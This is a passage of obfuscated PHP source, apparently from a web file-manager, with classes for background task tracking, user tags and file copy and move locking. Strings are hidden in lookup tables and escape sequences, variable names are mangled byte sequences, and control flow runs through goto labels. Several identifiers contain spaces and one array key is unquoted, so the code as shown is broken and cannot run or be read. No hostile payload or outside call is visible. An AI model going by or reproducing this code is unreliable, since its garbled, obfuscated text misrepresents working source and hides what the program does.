$”éÑıı£[$›åµîµ“[486]] . $›åµîµ“[178] . $ƒµ¦®œ¹); return !0; } public static function valueGet($£³»İ”Ê) { $©…ÂÏİ =& $_SERVER[´È¥ö†ö]; $šïÎÀ“é = $©…ÂÏİ[1770]; $í•ù¾³ = Model($©…ÂÏİ[519])->get($£³»İ”Ê, $šïÎÀ“é); if (is_null($í•ù¾³)) { Model($©…ÂÏİ[519])->set($©…ÂÏİ[826], $©…ÂÏİ[91], $šïÎÀ“é); Model($©…ÂÏİ[519])->set($©…ÂÏİ[1722], $©…ÂÏİ[230], $šïÎÀ“é); $í•ù¾³ = Model($©…ÂÏİ[519])->get($£³»İ”Ê, $šïÎÀ“é); } return $í•ù¾³; } private static function valueSet($üéŒß’©, $Ëä¢€« = false) { $™ŸÁï¤Á =& $_SERVER[´È¥ö†ö]; $›£¸øÜ = $™ŸÁï¤Á[1771]; CacheLock::lock($›£¸øÜ); $ÉŠ‡ƒ†Ó = Model($™ŸÁï¤Á[519])->set($üéŒß’©, $Ëä¢€«, $™ŸÁï¤Á[1770]); CacheLock::unlock($›£¸øÜ); return $ÉŠ‡ƒ†Ó; } protected static function log($¡ñ†î¤) { write_log($¡ñ†î¤, $_SERVER[´È¥ö†ö][1756]); } private static function cacheClear() { $µØ—ØÔğ =& $_SERVER[´È¥ö†ö]; Cache::clearMemory(Model($µØ—ØÔğ[519])->cacheKey($µØ—ØÔğ[1770])); Cache::clearMemory(Model($µØ—ØÔğ[519])->cacheKey($µØ—ØÔğ[1772])); Model($µØ—ØÔğ[1741])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($£œ£„·ù, $Ÿå’í± = '', $Î£Û×‘ª = 0, $•¼ùïá™ = '') { $ˆŸÛ‘¨š =& $_SERVER[´È¥ö†ö]; if (self::get($£œ£„·ù)) { return; } $this->task = array($ˆŸÛ‘¨š[486] => $£œ£„·ù, $ˆŸÛ‘¨š[1773] => USER_ID, $ˆŸÛ‘¨š[1659] => $•¼ùïá™, $ˆŸÛ‘¨š[537] => $ˆŸÛ‘¨š[12], $ˆŸÛ‘¨š[33] => $Ÿå’í±, $ˆŸÛ‘¨š[1141] => $ˆŸÛ‘¨š[12], $ˆŸÛ‘¨š[1139] => $Î£Û×‘ª, $ˆŸÛ‘¨š[1774] => 0, $ˆŸÛ‘¨š[1775] => 0, $ˆŸÛ‘¨š[1776] => 0, $ˆŸÛ‘¨š[1777] => timeFloat(), $ˆŸÛ‘¨š[1778] => 0, $ˆŸÛ‘¨š[1779] => 0, $ˆŸÛ‘¨š[1780] => 0, $ˆŸÛ‘¨š[1781] => 0, $ˆŸÛ‘¨š[826] => $ˆŸÛ‘¨š[1722]); $GLOBALS[$ˆŸÛ‘¨š[1782]] = 1; Hook::bind($ˆŸÛ‘¨š[1726], array($this, $ˆŸÛ‘¨š[1783])); Hook::bind($ˆŸÛ‘¨š[1784], array($this, $ˆŸÛ‘¨š[1785])); $this->startAfter(); Hook::trigger($ˆŸÛ‘¨š[1786], $this->task); $this->task[$ˆŸÛ‘¨š[1779]] = timeFloat(); } public function end($Æ–åÍ˜ = '') { $ä…›…ÍÉ =& $_SERVER[´È¥ö†ö]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ä…›…ÍÉ[1779]]) { self::valueSet($this->task[$ä…›…ÍÉ[486]], !1); } $this->isEnd = !0; if ($Æ–åÍ˜) { $this->task[$ä…›…ÍÉ[537]] = $Æ–åÍ˜; } self::log($ä…›…ÍÉ[1787] . $this->task[$ä…›…ÍÉ[486]] . $ä…›…ÍÉ[1788] . sprintf($ä…›…ÍÉ[928], timeFloat() - $this->task[$ä…›…ÍÉ[1777]]) . $ä…›…ÍÉ[1789]); Hook::unbind($ä…›…ÍÉ[1726], array($this, $ä…›…ÍÉ[1783])); Hook::unbind($ä…›…ÍÉ[1784], array($this, $ä…›…ÍÉ[1785])); $this->endAfter(); $¦²“¹õä = $this->task; $this->task = !1; Hook::trigger($ä…›…ÍÉ[1790], $¦²“¹õä); } public function update($€›³í­¾ = 0, $Ü»ùäƒÛ = false) { $£âˆÙ”© =& $_SERVER[´È¥ö†ö]; $Šã ô¢ =& $this->task; if (!$Šã ô¢) { return; } $Šã ô¢[$£âˆÙ”©[1774]] += $€›³í­¾; $Šã ô¢[$£âˆÙ”©[1778]] = timeFloat(); if ($Šã ô¢[$£âˆÙ”©[1139]]) { if ($Šã ô¢[$£âˆÙ”©[1139]] < $Šã ô¢[$£âˆÙ”©[1774]]) { $Šã ô¢[$£âˆÙ”©[1139]] = $Šã ô¢[$£âˆÙ”©[1774]]; } $»í”Œ°ı = timeFloat() - $Šã ô¢[$£âˆÙ”©[1777]] - $Šã ô¢[$£âˆÙ”©[1780]]; if ($»í”Œ°ı <= 0) { $»í”Œ°ı = 0.001; } $Šã ô¢[$£âˆÙ”©[1775]] = $Šã ô¢[$£âˆÙ”©[1774]] / $Šã ô¢[$£âˆÙ”©[1139]]; $Šã ô¢[$£âˆÙ”©[1776]] = $Šã ô¢[$£âˆÙ”©[1774]] / $»í”Œ°ı; if ($Šã ô¢[$£âˆÙ”©[1775]] > 0) { $Šã ô¢[$£âˆÙ”©[1781]] = $»í”Œ°ı * (1 - $Šã ô¢[$£âˆÙ”©[1775]]) / $Šã ô¢[$£âˆÙ”©[1775]]; } $Šã ô¢[$£âˆÙ”©[1781]] = $Šã ô¢[$£âˆÙ”©[1781]] <= 0 ? 0 : $Šã ô¢[$£âˆÙ”©[1781]]; } $this->updateAfter(); $×¥«÷ÒÅ = 0.2; if (timeFloat() - $Šã ô¢[$£âˆÙ”©[1779]] < $×¥«÷ÒÅ && !$Ü»ùäƒÛ) { return; } $îú§¬ìİ = self::get($Šã ô¢[$£âˆÙ”©[486]]); $–¡Èî¿¤ = $îú§¬ìİ[$£âˆÙ”©[826]]; if ($–¡Èî¿¤ == self::STATYS_KILL) { $¹‹©¥ÖÄ = array($£âˆÙ”©[1791] => LNG($£âˆÙ”©[1792]), $£âˆÙ”©[1296] => !1); Cache::set($£âˆÙ”©[1793] . $this->task[$£âˆÙ”©[486]], $¹‹©¥ÖÄ, 30); $this->onKill(); $this->end(); die; } else { if ($–¡Èî¿¤ == self::STATYS_STOP) { $¸ ÈˆÅƒ = 2; $îú§¬ìİ[$£âˆÙ”©[1780]] += $¸ ÈˆÅƒ; self::valueSet($Šã ô¢[$£âˆÙ”©[486]], $îú§¬ìİ); sleep($¸ ÈˆÅƒ); $this->update(); return; } } $Šã ô¢[$£âˆÙ”©[826]] = $–¡Èî¿¤ ? $–¡Èî¿¤ : $Šã ô¢[$£âˆÙ”©[826]]; $Šã ô¢[$£âˆÙ”©[1780]] = $îú§¬ìİ[$£âˆÙ”©[1780]] ? $îú§¬ìİ[$£âˆÙ”©[1780]] : 0; $Šã ô¢[$£âˆÙ”©[1779]] = timeFloat(); Hook::trigger($£âˆÙ”©[1794], $Šã ô¢); self::valueSet($Šã ô¢[$£âˆÙ”©[486]], $Šã ô¢); } public function onKillSet($®íÄ¨–Í, $Ÿ÷šıĞ¬ = array()) { $this->onKillCall = array($®íÄ¨–Í, $Ÿ÷šıĞ¬); } public function onKill() { $¨„Ù’ÉÂ =& $_SERVER[´È¥ö†ö]; self::log($¨„Ù’ÉÂ[1787] . $this->task[$¨„Ù’ÉÂ[486]] . $¨„Ù’ÉÂ[1795]); Hook::trigger($¨„Ù’ÉÂ[1796], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¢—ƒ¨å¢) { $µÍ¾×ß =& $_SERVER[´È¥ö†ö]; Cache::set($µÍ¾×ß[1793] . $this->task[$µÍ¾×ß[486]], $¢—ƒ¨å¢, 60); if (!is_array($¢—ƒ¨å¢) || !$¢—ƒ¨å¢[$µÍ¾×ß[1296]]) { self::log($µÍ¾×ß[1797] . json_encode($¢—ƒ¨å¢)); } return $¢—ƒ¨å¢; } public static function get($‡Ğ³ÜüÊ) { $”á’•¶è =& $_SERVER[´È¥ö†ö]; $ûÉêŠ§ä = self::valueGet($‡Ğ³ÜüÊ); if (is_array($ûÉêŠ§ä) && $ûÉêŠ§ä[$”á’•¶è[1798]]) { $¹Í›€€ = ActionApply($ûÉêŠ§ä[$”á’•¶è[1798]], array($ûÉêŠ§ä)); $ûÉêŠ§ä = is_array($¹Í›€€) ? $¹Í›€€ : $ûÉêŠ§ä; } return $ûÉêŠ§ä; } public static function listData() { $÷•Ë¢Ö = self::valueGet(); return array_sort_by($÷•Ë¢Ö, $_SERVER[´È¥ö†ö][1777], !0); } public static function kill($øñª¿Šå) { return self::changeStatus($øñª¿Šå, self::STATYS_KILL); } public static function stop($Õ¬¼åì) { return self::changeStatus($Õ¬¼åì, self::STATYS_STOP); } public static function restart($Ò™¦³í·) { return self::changeStatus($Ò™¦³í·, self::STATYS_RUNNING); } public static function killAll() { $©à©á¬ =& $_SERVER[´È¥ö†ö]; $ıÕŠˆ«Š = self::listData(); foreach ($ıÕŠˆ«Š as $•úıÚÈ) { self::kill($•úıÚÈ[$©à©á¬[486]]); } sleep(2); foreach ($ıÕŠˆ«Š as $•úıÚÈ) { self::valueSet($•úıÚÈ[$©à©á¬[486]], !1); } } private static function changeStatus($ ·Ó‹Ñ±, $©îªóÓÅ) { $ê×‰¦éò =& $_SERVER[´È¥ö†ö]; $ı»Œß¨‘ = self::valueGet($ ·Ó‹Ñ±); if (!$ı»Œß¨‘) { return !1; } $ı»Œß¨‘[$ê×‰¦éò[826]] = $©îªóÓÅ; self::valueSet($ ·Ó‹Ñ±, $ı»Œß¨‘); self::log($ê×‰¦éò[1799] . $ı»Œß¨‘[$ê×‰¦éò[486]] . $ê×‰¦éò[1800] . $©îªóÓÅ); return !0; } public static function valueGet($¡ü¿¯£ = false) { $øß«é˜Î =& $_SERVER[´È¥ö†ö]; if ($¡ü¿¯£) { $³ïÃÉ = Model($øß«é˜Î[531])->where(array($øß«é˜Î[97] => $¡ü¿¯£, $øß«é˜Î[33] => $øß«é˜Î[1148]))->find(); return $³ïÃÉ ? json_decode($³ïÃÉ[$øß«é˜Î[461]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¡¼Øïäê = false) { $ˆëÚÛ‰ =& $_SERVER[´È¥ö†ö]; $İ»„¨å = array($ˆëÚÛ‰[33] => $ˆëÚÛ‰[1148]); if ($¡¼Øïäê) { $İ»„¨å[$ˆëÚÛ‰[1773]] = $¡¼Øïäê; } $Åæšúô = Model($ˆëÚÛ‰[531])->where($İ»„¨å)->select(); $Åæšúô = $Åæšúô ? $Åæšúô : array(); foreach ($Åæšúô as $¨æºìÖË => $ï“¨Ãˆ) { $Åæšúô[$¨æºìÖË] = json_decode($ï“¨Ãˆ[$ˆëÚÛ‰[461]], !0); } return $Åæšúô; } public static function valueSet($Ï®æØœ», $¡šœ÷ÜÆ) { $½ôà‚¬ =& $_SERVER[´È¥ö†ö]; if (!$¡šœ÷ÜÆ) { return Model($½ôà‚¬[531])->where(array($½ôà‚¬[97] => $Ï®æØœ», $½ôà‚¬[33] => $½ôà‚¬[1148]))->delete(); } $¿Şíºµò = json_encode($¡šœ÷ÜÆ); if (!$¿Şíºµò) { ob_start(); var_dump($¡šœ÷ÜÆ); $ï“Øá£¡ = ob_get_clean(); self::log($½ôà‚¬[1801] . json_encode_force($ï“Øá£¡)); } if (!$Ï®æØœ» || !$¡šœ÷ÜÆ[$½ôà‚¬[486]]) { return !1; } $È’§úŒ = array($½ôà‚¬[33] => $½ôà‚¬[1148], $½ôà‚¬[1773] => USER_ID, $½ôà‚¬[97] => $Ï®æØœ», $½ôà‚¬[461] => $¿Şíºµò); $²ÉÀÄ˜¢ = $½ôà‚¬[1802]; CacheLock::lock($²ÉÀÄ˜¢); Model($½ôà‚¬[531])->add($È’§úŒ, array(), !0); CacheLock::unlock($²ÉÀÄ˜¢); } public static function log($Ü«ãĞşÁ) { if (!GLOBAL_DEBUG) { return; } write_log($Ü«ãĞşÁ, $_SERVER[´È¥ö†ö][1803]); } } $_file = $_SERVER[$_SERVER[´È¥ö†ö][307]]; goto A“¤°–Ÿ‰; cÔÓ¬ÔÆ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\x74\141\147\x4c\151\x73\x74"; public $modelType = "\x55\x73\x65\x72\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\x73\164\x79\x6c\145", "\163\x6f\162\164"); public function listData($çøıÖ¥Ü = false, $ÑóâÅÛ = "\163\157\162\164", $²á¥ê·Ğ = false) { return parent::listData($çøıÖ¥Ü, $ÑóâÅÛ, $²á¥ê·Ğ); } public function remove($§•Ê¸¼³) { return parent::remove($§•Ê¸¼³); } public function add($‹ÇâãĞ‹, $ÏäŸñÈŠ = "\154\141\x62\145\154\55\147\x72\145\171\x2d\156\x6f\162\155\x61\x6c") { $Æø„“ =& $_SERVER[´È¥ö†ö]; if ($this->findByName($‹ÇâãĞ‹)) { return !1; } $Úİù¦˜Ç = array($Æø„“[505] => $‹ÇâãĞ‹, $Æø„“[569] => $ÏäŸñÈŠ, $Æø„“[1978] => $this->getSort($Æø„“[346]) + 1); return parent::insert($Úİù¦˜Ç); } public function update($Æ…¤™ç¤, $ã§ÑöÛı) { $ïÂãêé­ =& $_SERVER[´È¥ö†ö]; $á²©¿Æ¹ = $this->listData($Æ…¤™ç¤); $¿©ü¿ = $this->findByName($ã§ÑöÛı[$ïÂãêé­[32]]); if (!$á²©¿Æ¹ || $¿©ü¿ && $¿©ü¿[$ïÂãêé­[486]] != $á²©¿Æ¹[$ïÂãêé­[486]]) { return !1; } return parent::update($Æ…¤™ç¤, $ã§ÑöÛı); } public function moveTop($®àÄ°©É) { $ÉÏÓĞ±¯ =& $_SERVER[´È¥ö†ö]; $åŞƒºĞÑ = parent::listData(); $€ùË€¤ = $this->getSort($ÉÏÓĞ±¯[345]); foreach ($åŞƒºĞÑ as &$ÁŒ¬”¯) { if ($ÁŒ¬”¯[$ÉÏÓĞ±¯[486]] == $®àÄ°©É) { $ÁŒ¬”¯[$ÉÏÓĞ±¯[1998]] = $€ùË€¤; continue; } $ÁŒ¬”¯[$ÉÏÓĞ±¯[1998]] += 1; } unset($ÁŒ¬”¯); return parent::resetData($åŞƒºĞÑ); } public function moveBottom($õËÕĞ•) { $‡Øû—Û… =& $_SERVER[´È¥ö†ö]; $½Ó‘Ö™È = $this->getSort($‡Øû—Û…[346]) + 1; return parent::update($õËÕĞ•, array($‡Øû—Û…[1998] => $½Ó‘Ö™È)); } public function resetSort($Å´¡Äƒ) { $ğ¦îÒä‡ =& $_SERVER[´È¥ö†ö]; $Ç­¬Œ§à = array(); $Å´¡Äƒ = is_array($Å´¡Äƒ) ? $Å´¡Äƒ : array(); for ($ÊéÀÙ°Ş = 0; $ÊéÀÙ°Ş < count($Å´¡Äƒ); $ÊéÀÙ°Ş++) { $Ç­¬Œ§à[$Å´¡Äƒ[$ÊéÀÙ°Ş] . $ğ¦îÒä‡[12]] = $ÊéÀÙ°Ş + 1; } $Ä…×¸ = parent::listData(); foreach ($Ä…×¸ as &$¾²‚—Áü) { $‰´ç³…æ = $Ç­¬Œ§à[$¾²‚—Áü[$ğ¦îÒä‡[486]]]; $¾²‚—Áü[$ğ¦îÒä‡[1998]] = $‰´ç³…æ ? $‰´ç³…æ : $¾²‚—Áü[$ğ¦îÒä‡[1998]]; } unset($¾²‚—Áü); return parent::resetData($Ä…×¸); } private function getSort($úÅ«ˆÓø) { $ÖÆÚû =& $_SERVER[´È¥ö†ö]; $¶â§ÒÄ— = parent::listData(); $Œšü»ã® = array_to_keyvalue($¶â§ÒÄ—, $ÖÆÚû[12], $ÖÆÚû[1998]); if (!$Œšü»ã®) { $Œšü»ã® = array(0); } $¢¡­˜â = $úÅ«ˆÓø == $ÖÆÚû[346] ? max($Œšü»ã®) : min($Œšü»ã®); return intval($¢¡­˜â); } } goto BƒçÁÃ¼; aù»±ŒÕ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($­É¼€í§) { $Ã»æÙõİ =& $_SERVER[´È¥ö†ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ã»æÙõİ[632], $­É¼€í§); $ù˜á®´ô = 1; $this->_lockEvent($­É¼€í§, array($Ã»æÙõİ[633], $Ã»æÙõİ[634]), $ù˜á®´ô); $this->_lockParent($­É¼€í§, array($Ã»æÙõİ[634]), $ù˜á®´ô); $this->_lockEvent($­É¼€í§, array($Ã»æÙõİ[635], $Ã»æÙõİ[636]), $ù˜á®´ô); $this->_lockCheckEnd($Ã»æÙõİ[632], $­É¼€í§); } public function lockCopyEnd($À”¬Š´Ò) { $³í‘úší =& $_SERVER[´È¥ö†ö]; if (!$this->allowLock()) { return; } $Åá¾ú¡ë = 0; $this->_lockEvent($À”¬Š´Ò, array($³í‘úší[633], $³í‘úší[634]), $Åá¾ú¡ë); $this->_lockParent($À”¬Š´Ò, array($³í‘úší[634]), $Åá¾ú¡ë); $this->_lockEvent($À”¬Š´Ò, array($³í‘úší[635], $³í‘úší[636]), $Åá¾ú¡ë); } public function lockWriteStart($·ÊñÚŞå, $…Şğ¶‹ = '') { $â¯ÚŞ” =& $_SERVER[´È¥ö†ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($â¯ÚŞ”[633], $·ÊñÚŞå); $Æ«Ö˜õ = 1; $this->_lockKey($â¯ÚŞ”[637] . $·ÊñÚŞå . $â¯ÚŞ”[10] . $…Şğ¶‹, $Æ«Ö˜õ); $this->_lockEvent($·ÊñÚŞå, array($â¯ÚŞ”[632], $â¯ÚŞ”[634]), $Æ«Ö˜õ); $this->_lockParent($·ÊñÚŞå, array($â¯ÚŞ”[632], $â¯ÚŞ”[634]), $Æ«Ö˜õ); $this->_lockCheckEnd($â¯ÚŞ”[633], $·ÊñÚŞå); } public function lockWriteEnd($€Š­øç, $œáÄâÙá = '') { $¤–àÌğí =& $_SERVER[´È¥ö†ö]; if (!$this->allowLock()) { return; } $—Îúàôİ = 0; $this->_lockKey($¤–àÌğí[637] . $€Š­øç . $¤–àÌğí[10] . $œáÄâÙá, $—Îúàôİ); $this->_lockEvent($€Š­øç, array($¤–àÌğí[632], $¤–àÌğí[634]), $—Îúàôİ); $this->_lockParent($€Š­øç, array($¤–àÌğí[632], $¤–àÌğí[634]), $—Îúàôİ); } public function lockMoveStart($åÎ—˜Ö¼) { $şÈĞ‘Ë¡ =& $_SERVER[´È¥ö†ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($şÈĞ‘Ë¡[634], $åÎ—˜Ö¼); $ü†Öí±ó = 1; $this->_lockKey($şÈĞ‘Ë¡[638] . $åÎ—˜Ö¼, $ü†Öí±ó); $this->_lockEvent($åÎ—˜Ö¼, array($şÈĞ‘Ë¡[632], $şÈĞ‘Ë¡[633]), $ü†Öí±ó); $this->_lockParent($åÎ—˜Ö¼, array($şÈĞ‘Ë¡[632], $şÈĞ‘Ë¡[634]), $ü†Öí±ó); $this->_lockEvent($åÎ—˜Ö¼, array($şÈĞ‘Ë¡[639], $şÈĞ‘Ë¡[635], $şÈĞ‘Ë¡[636]), $ü†Öí±ó); $this->_lockCheckEnd($şÈĞ‘Ë¡[634], $åÎ—˜Ö¼); } public function lockMoveEnd($¯æŠ¹Ëã) { $–Ğ»áç« =& $_SERVER[´È¥ö†ö]; if (!$this->allowLock()) { return; } $İ³È›è¡ = 0; $this->_lockKey($–Ğ»áç«[638] . $¯æŠ¹Ëã, $İ³È›è¡); $this->_lockEvent($¯æŠ¹Ëã, array($–Ğ»áç«[632], $–Ğ»áç«[633]), $İ³È›è¡); $this->_lockParent($¯æŠ¹Ëã, array($–Ğ»áç«[632], $–Ğ»áç«[634]), $İ³È›è¡); $this->_lockEvent($¯æŠ¹Ëã, array($–Ğ»áç«[639], $–Ğ»áç«[635], $–Ğ»áç«[636]), $İ³È›è¡); } private function _lockCheck($ŞúÑœÀĞ, $èıîßıä) { $€ã¶·á =& $_SERVER[´È¥ö†ö]; $ö„åòÌé = $this->sourceInfo($èıîßıä); $‡ˆªŠÅ… = $ŞúÑœÀĞ . $€ã¶·á[10] . $èıîßıä; $this->_lockTimeStart[$‡ˆªŠÅ…] = timeFloat(); if (!is_array($ö„åòÌé)) { return; } $ı·à«¥ = LNG($€ã¶·á[640]); CacheLock::setErrorMsg($€ã¶·á[176] . htmlspecialchars($ö„åòÌé[$€ã¶·á[32]]) . $€ã¶·á[178] . $ı·à«¥); $this->_lockKey($‡ˆªŠÅ…, 1); $this->_lockKey($‡ˆªŠÅ…, 0); $Š€“²âÜ = array_reverse($this->parentLevelArray($ö„åòÌé[$€ã¶·á[595]])); foreach ($Š€“²âÜ as $ìÀ¼¼Ğº) { $‡ˆªŠÅ… = $ŞúÑœÀĞ . $€ã¶·á[641] . $ìÀ¼¼Ğº; if (CacheLock::lockGet($€ã¶·á[642] . $‡ˆªŠÅ…)) { $ö„åòÌé = $this->sourceInfo($ìÀ¼¼Ğº); CacheLock::setErrorMsg($€ã¶·á[176] . htmlspecialchars($ö„åòÌé[$€ã¶·á[32]]) . $€ã¶·á[178] . $ı·à«¥); $this->_lockKey($‡ˆªŠÅ…, 1); $this->_lockKey($‡ˆªŠÅ…, 0); } } } private function _lockCheckEnd($¼¯ˆØŞú, $„Ÿ±Úû¡) { $®ÕÉ„ß =& $_SERVER[´È¥ö†ö]; $ÛµèÊ‘ = $¼¯ˆØŞú . $®ÕÉ„ß[10] . $„Ÿ±Úû¡; CacheLock::setErrorMsg($®ÕÉ„ß[465]); if (!isset($this->_lockTimeStart[$ÛµèÊ‘])) { return; } $§Ø”èÀ¥ = timeFloat() - $this->_lockTimeStart[$ÛµèÊ‘]; unset($this->_lockTimeStart[$ÛµèÊ‘]); if ($§Ø”èÀ¥ > 0.5) { unset(self::$cacheSourceInfo[$®ÕÉ„ß[544] . $„Ÿ±Úû¡]); } $üÃ‡³€ø = $this->sourceInfo($„Ÿ±Úû¡); if (!$üÃ‡³€ø) { show_json(LNG($®ÕÉ„ß[108]), !1); } } private function _lockParent($øš˜Ì•, $äâáİ¡ä, $üØóşÖÌ) { if (!$this->autoLockSet) { return; } $‰ÛÏÕçÆ = $this->sourceInfo($øš˜Ì•); if (!is_array($‰ÛÏÕçÆ)) { return; } $‘ÛÃ§ç = array_reverse($this->parentLevelArray($‰ÛÏÕçÆ[$_SERVER[´È¥ö†ö][595]])); foreach ($‘ÛÃ§ç as $®ÀšÜ„) { $this->_lockEvent($®ÀšÜ„, $äâáİ¡ä, $üØóşÖÌ); } } private function _lockEvent($ƒ½òé¾ú, $÷‚â•»î, $˜›åØ¢î) { $Ô¯ĞÁàÌ =& $_SERVER[´È¥ö†ö]; if (!$this->autoLockSet) { return; } foreach ($÷‚â•»î as $µ®¨Œ–Ä) { $­åÄê” = $µ®¨Œ–Ä . $Ô¯ĞÁàÌ[10] . $ƒ½òé¾ú; if ($˜›åØ¢î && CacheLock::lockGet($Ô¯ĞÁàÌ[642] . $­åÄê”)) { continue; } $this->_lockKey($­åÄê”, $˜›åØ¢î); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ê¼‘âáÄ, $¸ØÆ„€¬ = 1) { $–»ÊÑ±ù = $_SERVER[´È¥ö†ö][642] . md5($Ê¼‘âáÄ); if ($¸ØÆ„€¬) { if (isset(self::$_lockItemArr[$–»ÊÑ±ù])) { return; } self::$_lockItemArr[$–»ÊÑ±ù] = 1; CacheLock::lock($–»ÊÑ±ù, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$–»ÊÑ±ù])) { return; } unset(self::$_lockItemArr[$–»ÊÑ±ù]); CacheLock::unlock($–»ÊÑ±ù); } } public function isParentOf($Î «Å™¥, $ì’ğÇá¥) { $¦ğ•È™é =& $_SERVER[´È¥ö†ö]; $ÃïÔ½ÕÚ = $this->sourceInfo($Î «Å™¥); $ÌŞõŒ‹ = $this->sourceInfo($ì’ğÇá¥); $ª¿éññÆ = $ÃïÔ½ÕÚ[$¦ğ•È™é[595]] . $ÃïÔ½ÕÚ[$¦ğ•È™é[193]] . $¦ğ•È™é[50]; $¤˜É²é = $ÌŞõŒ‹[$¦ğ•È™é[595]] . $ÌŞõŒ‹[$¦ğ•È™é[193]] . $¦ğ•È™é[50]; $Šğû¸ì = strpos($¤˜É²é, $ª¿éññÆ) === 0; return $Šğû¸ì; } private $targetIsDelete = 0; public function copy($“ºÍŞìş, $ò¹¬ ñõ, $³¥·€¢Ó = REPEAT_REPLACE, $°¸ŞØËæ = '') { $Éº£šÎ× =& $_SERVER[´È¥ö†ö]; $ËŸ“İî¹ = $this->sourceInfo($“ºÍŞìş); $Ê³ü¦›É = $this->sourceInfo($ò¹¬ ñõ); if (!$ËŸ“İî¹ || !$Ê³ü¦›É || $Ê³ü¦›É[$Éº£šÎ×[496]] != $Éº£šÎ×[91]) { return !1; } if ($this->isParentOf($“ºÍŞìş, $ò¹¬ ñõ)) { return !1; } $ŸºÌÇü = $°¸ŞØËæ ? $°¸ŞØËæ : $ËŸ“İî¹[$Éº£šÎ×[32]]; $this->lockCopyStart($“ºÍŞìş); $this->lockWriteStart($ò¹¬ ñõ, $ŸºÌÇü); $×ïª°¼ = array($Éº£šÎ×[643] => array(), $Éº£šÎ×[644] => array(), $Éº£šÎ×[645] => array()); $this->targetIsDelete = intval($ËŸ“İî¹[$Éº£šÎ×[516]]); $¤õªç‘À = $this->fileNameExistAuto($ò¹¬ ñõ, $ËŸ“İî¹); $¾êÜ•¨÷ = $this->_copy($“ºÍŞìş, $ò¹¬ ñõ, $³¥·€¢Ó, $×ïª°¼, !0, $°¸ŞØËæ); $this->_childrenListClear(); $this->lockCopyEnd($“ºÍŞìş); $this->lockWriteEnd($ò¹¬ ñõ, $ŸºÌÇü); if ($ËŸ“İî¹[$Éº£šÎ×[496]] == $Éº£šÎ×[91] && $¤õªç‘À == $¾êÜ•¨÷) { $this->folderSizeResetChildren($¤õªç‘À); } Model($Éº£šÎ×[646])->addAll($×ïª°¼[$Éº£šÎ×[644]], array(), !0); if ($¤õªç‘À != $¾êÜ•¨÷ || $ËŸ“İî¹[$Éº£šÎ×[496]] == $Éº£šÎ×[91]) { Model($Éº£šÎ×[647])->eventCopy($¾êÜ•¨÷); } $this->saveAll($×ïª°¼[$Éº£šÎ×[645]]); Model($Éº£šÎ×[232])->linkAdd($×ïª°¼[$Éº£šÎ×[643]]); $this->folderSizeReset($ò¹¬ ñõ); $this->updateModifyTime($ò¹¬ ñõ); return $¾êÜ•¨÷; } private function _copy($¬ˆ¾õòş, $º˜†¢á™, $®‡ëŒâ›, &$¬ìºç´¢, $ÄÙÚ¯–¥, $»ĞÌÂ‘• = '') { $È°·åÓ¾ =& $_SERVER[´È¥ö†ö]; $Üé«Ø”Ù = $this->sourceInfoCache($¬ˆ¾õòş); $… ”Áá© = $Üé«Ø”Ù[$È°·åÓ¾[496]] == $È°·åÓ¾[91]; $ËÓûÚµ  = $»ĞÌÂ‘• ? $»ĞÌÂ‘• : $Üé«Ø”Ù[$È°·åÓ¾[32]]; $Í½ÕëÇ‚ = $this->fileNameExistAuto($º˜†¢á™, $Üé«Ø”Ù); if ($ÄÙÚ¯–¥) { $this->_childrenAllMake($¬ˆ¾õòş); if ($… ”Áá© && $Í½ÕëÇ‚) { $this->_childrenAllMake($Í½ÕëÇ‚); } } if (!$Í½ÕëÇ‚) { return $this->_copyCreate($¬ˆ¾õòş, $º˜†¢á™, $ËÓûÚµ , $¬ìºç´¢); } $¼é’òãƒ = $Í½ÕëÇ‚; if ($… ”Áá©) { if ($®‡ëŒâ› == REPEAT_RENAME_FOLDER) { $ËÓûÚµ  = $this->fileNameAutoCache($º˜†¢á™, $ËÓûÚµ , $®‡ëŒâ›, $… ”Áá©); $¼é’òãƒ = $this->_copyCreate($¬ˆ¾õòş, $º˜†¢á™, $ËÓûÚµ , $¬ìºç´¢); } else { $„£öÔ™  = $this->_childrenList($¬ˆ¾õòş); foreach ($„£öÔ™  as $Ù²Ãò) { $this->_copy($Ù²Ãò[$È°·åÓ¾[193]], $Í½ÕëÇ‚, $®‡ëŒâ›, $¬ìºç´¢, !1); } } } else { if ($®‡ëŒâ› == REPEAT_RENAME || $®‡ëŒâ› == REPEAT_RENAME_FOLDER) { $ËÓûÚµ  = $this->fileNameAutoCache($º˜†¢á™, $ËÓûÚµ , $®‡ëŒâ›, $… ”Áá©); $¼é’òãƒ = $this->_copyCreate($¬ˆ¾õòş, $º˜†¢á™, $ËÓûÚµ , $¬ìºç´¢); } else { if ($®‡ëŒâ› == REPEAT_REPLACE) { $şŸğ«ÖÜ = $this->sourceInfoCache($Í½ÕëÇ‚); $Ï¥ò¦¥± = $this->fileHistory($şŸğ«ÖÜ, $Üé«Ø”Ù[$È°·åÓ¾[552]], $Üé«Ø”Ù[$È°·åÓ¾[79]]); if ($Ï¥ò¦¥±) { $¬ìºç´¢[$È°·åÓ¾[643]][] = $Üé«Ø”Ù[$È°·åÓ¾[552]]; } } else { if ($®‡ëŒâ› == REPEAT_SKIP) { } } } Hook::trigger($È°·åÓ¾[648], array($È°·åÓ¾[649], $Üé«Ø”Ù, 0)); } return $¼é’òãƒ; } private function _copyCreate($»‰¹´áï, $Ş ÓÂ—‘, $ûíÀôó , 